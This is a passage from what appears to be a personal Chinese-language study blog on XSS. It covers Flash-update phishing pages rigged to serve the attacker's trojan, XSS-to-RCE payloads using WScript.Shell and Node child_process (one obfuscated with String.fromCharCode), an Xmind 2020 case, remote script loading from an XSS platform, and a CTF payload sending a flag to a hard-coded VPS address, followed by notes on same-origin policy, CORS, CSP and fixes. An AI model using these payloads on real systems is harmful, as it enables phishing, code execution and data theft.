<h3 id="Flash-弹窗钓鱼"><a href="#Flash-弹窗钓鱼" class="headerlink" title="Flash 弹窗钓鱼"></a>Flash 弹窗钓鱼</h3><ul>
<li>项目一地址：<a target="_blank" rel="noopener" href="https://github.com/Wileysec/adobe-flash-phishing-page">https://github.com/Wileysec/adobe-flash-phishing-page</a></li>
</ul>
<p>该项目是模仿的 Flash Player 中文官网的页面：</p>
<p>[<img src="/../images/20210523094717-ce2b906e-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094717-ce2b906e-bb68-1.png)</p>
<p>需要在index.html中的加入我们制作的木马的链接地址：</p>
<p>[<img src="/../images/20210523094718-ce9bd752-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ce9bd752-bb68-1.png)</p>
<ul>
<li>项目二地址：<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Flash-Pop">https://github.com/r00tSe7en/Flash-Pop</a></li>
</ul>
<p>该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的：</p>
<p>[<img src="/../images/20210523094718-ced9a208-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-ced9a208-bb68-1.png)</p>
<p>找到flash.js，搜索链接“<a target="_blank" rel="noopener" href="https://www.se7ensec.cn/%E2%80%9D%EF%BC%8C%E5%B0%86%E5%85%B6%E6%94%B9%E4%B8%BA%E6%88%91%E4%BB%AC%E5%88%B6%E4%BD%9C%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9A%84%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BF%9D%E5%AD%98%E5%8D%B3%E5%8F%AF%EF%BC%9A">https://www.se7ensec.cn/”，将其改为我们制作的木马的链接地址，然后保存即可：</a></p>
<p>[<img src="/../images/20210523094718-cefeb124-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094718-cefeb124-bb68-1.png)</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。</p>
<h3 id="使用-WScript-Shell-执行系统命令"><a href="#使用-WScript-Shell-执行系统命令" class="headerlink" title="使用 WScript.Shell 执行系统命令"></a>使用 WScript.Shell 执行系统命令</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
<li><p>Internet Explorer </p>
</li>
<li><p>在IE上打开设置中的Intertnet选项-“安全”-“自定义级别”-“对没有标记为安全的activex控件进行初始化和脚本运行-设置成启用，如下</p>
<p><img src="/../images/20190121110917-f04620ae-1d29-1-1686840019398.jpeg" alt="20190121110917-f04620ae-1d29-1"></p>
</li>
</ul>
<p>WScript.Shell（Windows Script Host Runtime Library）是一个对象，对应的文件是C:&#x2F;WINDOWS&#x2F;system32&#x2F;wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">shell.<span class="title function_">run</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20230524224855708-1686840019398.png" alt="image-20230524224855708"></p>
<p>有时候为了 Bypass 也可以使用 <code>String.fromCharCode</code> 从 Ascii 来转化恶意代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;eval(String.fromCharCode(10,118,97,114,32,111,61,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,39,87,83,99,114,105,112,116,46,115,104,101,108,108,39,41,59,10,111,46,114,117,110,40,39,99,97,108,99,46,101,120,101,39,41,59,10));&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用-child-process-执行系统命令"><a href="#使用-child-process-执行系统命令" class="headerlink" title="使用 child_process 执行系统命令"></a>使用 child_process 执行系统命令</h3><p>如果目标环境启用了 <strong>NodeJS</strong> 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;const exec = require(&#x27;child_process&#x27;).exec;exec(&#x27;whoami&#x27;).stdout.on(&#x27;data&#x27;, function (data) &#123;alert(data);&#125;)&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=&quot;require(&#x27;child_process&#x27;).exec(&#x27;&lt;更多稀奇古怪的Payload&gt;&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS 。</p>
<h3 id="Xmind-2020-XSS-to-RCE"><a href="#Xmind-2020-XSS-to-RCE" class="headerlink" title="Xmind 2020 XSS  to RCE"></a>Xmind 2020 XSS  to RCE</h3><p>漏洞利用很简单，在 “思维导图” 中输出 Payload：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>

<p>[<img src="/../images/20210523094723-d1fa41ae-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094723-d1fa41ae-bb68-1.png)</p>
<p>切换到 “大纲” 中，按下一个功能键即可触发攻击：</p>
<p>[<img src="/../images/20210523094724-d23097e0-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d23097e0-bb68-1.png)</p>
<p>由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。</p>
<p>[<img src="/../images/20210523094724-d269b494-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094724-d269b494-bb68-1.png)</p>
<p>[<img src="/../images/20210523094725-d2c17756-bb68-1.png" alt="img">](.&#x2F;谭谈 XSS 那些世人皆知的事 - 先知社区_files&#x2F;20210523094725-d2c17756-bb68-1.png)</p>
<h3 id="蚁剑的XSS-to-RCE"><a href="#蚁剑的XSS-to-RCE" class="headerlink" title="蚁剑的XSS to RCE"></a>蚁剑的XSS to RCE</h3><p><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword/issues/147">https://github.com/AntSwordProject/antSword/issues/147</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8167#toc-0">浅谈蚁剑RCE - 先知社区</a></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源的定义</p>
<p><img src="/../images/pxbcwxexdh-1686840019399.png" alt="img"></p>
<p>同源的目的</p>
<blockquote>
<p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p>
<p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
<p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
</blockquote>
<h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><ul>
<li><p>cors（支持所有http请求）</p>
<p>CORS（Cross-Origin Resource Sharing）是一种跨域资源共享机制，它允许Web应用程序从不同的域名访问资源，而不受同源策略的限制。CORS机制需要在服务端进行配置，并且需要在每个跨域请求中添加特定的HTTP头部信息，例如“Access-Control-Allow-Origin”和“Access-Control-Allow-Methods”等。CORS机制可以支持各种类型的HTTP请求，包括GET、POST、PUT、DELETE等，因此它在Web应用程序中的应用非常广泛。</p>
</li>
<li><p>jsonp（只支持get请求）</p>
<p>JSONP（JSON with Padding）是一种利用<script>标签的GET请求实现跨域数据传输的技术，它通过在请求URL中添加一个回调函数名来实现跨域访问。由于JSONP是基于<script>标签的GET请求，不具备修改数据的能力，因此它不会引起CSRF漏洞。但是，由于JSONP仅支持GET请求，因此它的应用场景受到限制。</p>
</li>
</ul>
<h4 id="xss跨域"><a href="#xss跨域" class="headerlink" title="xss跨域"></a>xss跨域</h4><p>引入其他恶意script代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="string">&#x27;window.s=document.createElement(&quot;script&quot;);window.s.src=&quot;//xsspt.com/XXcxou&quot;;document.body.appendChild(window.s)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="跨源资源共享-CORS"><a href="#跨源资源共享-CORS" class="headerlink" title="跨源资源共享--CORS"></a>跨源资源共享--CORS</h2><p><a target="_blank" rel="noopener" href="http://huang-x-h.github.io/2015/03/11/cors-preflight/">XMLHttpRequest跨域预检</a></p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication</a></p>
<p>预检的response数据包</p>
<blockquote>
<p>Access-Control-Allow-Origin：告诉浏览器允许该源访问资源。<br>Access-Control-Expose-Headers：告诉浏览器允许获得除了基本响应头外的哪些响应头<br>Access-Control-Allow-Credentials: true 是否允许浏览器读取 response 的内容<br>Access-Control-Allow-Methods： 指定了访问资源时允许使用的请求方法<br>Access-Control-Allow-Headers： 指明了实际请求中允许携带的标头字段。</p>
</blockquote>
<p>携带cookie跨域</p>
<p><img src="/../images/image-20230320220034977-1686840019399.png" alt="image-20230320220034977"></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/byErichas/p/15918919.html">https://www.cnblogs.com/byErichas/p/15918919.html</a></p>
<h2 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h2><h4 id="Apache-httpOnly-Cookie泄露-CVE-2012-0053"><a href="#Apache-httpOnly-Cookie泄露-CVE-2012-0053" class="headerlink" title="Apache httpOnly Cookie泄露( CVE-2012-0053)"></a>Apache httpOnly Cookie泄露( CVE-2012-0053)</h4><h4 id="CORS-cookie回显"><a href="#CORS-cookie回显" class="headerlink" title="CORS+cookie回显"></a>CORS+cookie回显</h4><p>例题</p>
<p><a target="_blank" rel="noopener" href="https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss">https://nikoeurus.github.io/2019/11/14/UNCTF-Web%E5%A4%8D%E7%8E%B0/#easyxss</a></p>
<p>条件1</p>
<blockquote>
<p>response数据包中</p>
<p>Access-Control-Allow-Headers: X-Requested-With，说明了我们可以通过<strong>XHR</strong>请求来访问网站</p>
<p><code>XMLHttpRequest</code>是用于在后台与服务器交换数据。如果设置XHR请求网站，那么请头部必然会带有：<code>Origin:xxx</code>，则会被服务器视为同源访问</p>
</blockquote>
<p>条件2</p>
<p>没有关闭debug模式，导致cookie回显</p>
<p><img src="/../images/39-1686840019399.png" alt="img"></p>
<p>利用<code>location.href</code>重定向到vps，从而带出cookie</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)&#123;</span><br><span class="line">        location.<span class="property">href</span>=<span class="string">&#x27;http://106.15.250.162:8888/?flag=&#x27;</span>+ xmlhttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="string">&#x27;flag\\&#123;(.\*?)\\&#125;&#x27;</span>)[<span class="number">1</span>]&#125;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/index.php/treehole/view?id=&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="CST-trace请求"><a href="#CST-trace请求" class="headerlink" title="CST--trace请求"></a>CST--trace请求</h4><p>TRACE 方法会返回原始请求报文，其中就包含了cookie</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaopei/p/11380349.html">https://www.cnblogs.com/gaopei/p/11380349.html</a></p>
<h2 id="JSONP劫持漏洞"><a href="#JSONP劫持漏洞" class="headerlink" title="JSONP劫持漏洞"></a>JSONP劫持漏洞</h2><p><a target="_blank" rel="noopener" href="https://wolke.cn/post/c8aa67d0.html">CORS跨域漏洞与JSONP劫持 | wolke</a></p>
<h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12370#toc-25">https://xz.aliyun.com/t/12370#toc-25</a></p>
<blockquote>
<p>CSP指的是Content Security Policy，即内容安全策略。它是一种安全机制，用于保护网站免受跨站脚本攻击（XSS攻击）、数据盗取等Web攻击的影响。<br>CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置。<br>通过CSP，网站管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被恶意脚本攻击的风险。</p>
</blockquote>
<p><img src="/../images/image-20230512151453267-1686840019399.png" alt="image-20230512151453267"></p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul>
<li>CSP</li>
<li>html实体编码，黑名单，转义字符</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://Fgtbnc.github.io">Khaz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fgtbnc.github.io/2023/06/01/XSS/">http://fgtbnc.github.io/2023/06/01/XSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Fgtbnc.github.io" target="_blank">Khaz</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/06/01/JWT%E4%BB%A4%E7%89%8C/"><img class="prev-cover" src="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JWT安全</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/01/Tomcat%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Tomcat漏洞</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s1.ax1x.com/2023/05/31/p9x0Eg1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Khaz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">记录一些自己的学习笔记</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number"></span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-number"></span> <span class="toc-text">类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8Cjavascript"><span class="toc-number"></span> <span class="toc-text">如何执行javascript</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number"></span> <span class="toc-text">绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.</span> <span class="toc-text">绕过空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7"><span class="toc-number">2.</span> <span class="toc-text">绕过引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.</span> <span class="toc-text">绕过括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">字符串拼接绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8eval-%E5%87%BD%E6%95%B0"><span class="toc-number">4.3.1.</span> <span class="toc-text">利用eval()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8top"><span class="toc-number">4.3.2.</span> <span class="toc-text">利用top</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">输出点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8%E5%B1%9E%E6%80%A7%E9%87%8C"><span class="toc-number">5.1.</span> <span class="toc-text">输出在属性里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4"><span class="toc-number">5.2.</span> <span class="toc-text">输出在HTML标签之间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%9C%A8script%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4"><span class="toc-number">5.3.</span> <span class="toc-text">输出在script标签之间</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">字符编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E7%BD%91%E9%A1%B5%E8%A7%A3%E7%A0%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">请求网页解码流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">HTML 实体编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javascript-%E7%BC%96%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">Javascript 编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-%E7%BC%96%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">Unicode 编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8DOM%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84JavaScript%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">在DOM环境中的JavaScript编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E7%BC%96%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">混合编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SVG%EF%BC%9AXSS%E7%9A%84%E4%B8%80%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">SVG：XSS的一个黑魔法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number"></span> <span class="toc-text">测试流程思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">初步测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">测试其他标签和属性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95"><span class="toc-number"></span> <span class="toc-text">攻击面拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.</span> <span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-XSS-%E7%9B%97%E5%8F%96-Cookie"><span class="toc-number">1.1.</span> <span class="toc-text">通过 XSS 盗取 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash-%E5%BC%B9%E7%AA%97%E9%92%93%E9%B1%BC"><span class="toc-number">1.2.</span> <span class="toc-text">Flash 弹窗钓鱼</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-WScript-Shell-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.</span> <span class="toc-text">使用 WScript.Shell 执行系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-child-process-%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">使用 child_process 执行系统命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xmind-2020-XSS-to-RCE"><span class="toc-number">2.3.</span> <span class="toc-text">Xmind 2020 XSS  to RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E7%9A%84XSS-to-RCE"><span class="toc-number">2.4.</span> <span class="toc-text">蚁剑的XSS to RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number"></span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B7%A8%E5%9F%9F"><span class="toc-number">2.</span> <span class="toc-text">如何跨域</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/23/shiro%E6%BC%8F%E6%B4%9E/" title="shiro漏洞"><img src="https://fgtbnc.github.io/images/wallhaven-vg3qk8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="shiro漏洞"/></a><div class="content"><a class="title" href="/2023/06/23/shiro%E6%BC%8F%E6%B4%9E/" title="shiro漏洞">shiro漏洞</a><time datetime="2023-06-23T07:00:25.000Z" title="发表于 2023-06-23 15:00:25">2023-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Spring框架漏洞"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring框架漏洞"/></a><div class="content"><a class="title" href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Spring框架漏洞">Spring框架漏洞</a><time datetime="2023-06-22T02:40:25.000Z" title="发表于 2023-06-22 10:40:25">2023-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="若依漏洞"><img src="https://fgtbnc.github.io/images/wallhaven-vg3qk8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="若依漏洞"/></a><div class="content"><a class="title" href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="若依漏洞">若依漏洞</a><time datetime="2023-06-21T13:11:25.000Z" title="发表于 2023-06-21 21:11:25">2023-06-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/" title="实习面试"><img src="https://fgtbnc.github.io/images/wallhaven-vg3qk8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实习面试"/></a><div class="content"><a class="title" href="/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/" title="实习面试">实习面试</a><time datetime="2023-06-21T09:00:25.000Z" title="发表于 2023-06-21 17:00:25">2023-06-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="waf绕过学习"><img src="https://fgtbnc.github.io/images/wallhaven-vg3qk8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="waf绕过学习"/></a><div class="content"><a class="title" href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" 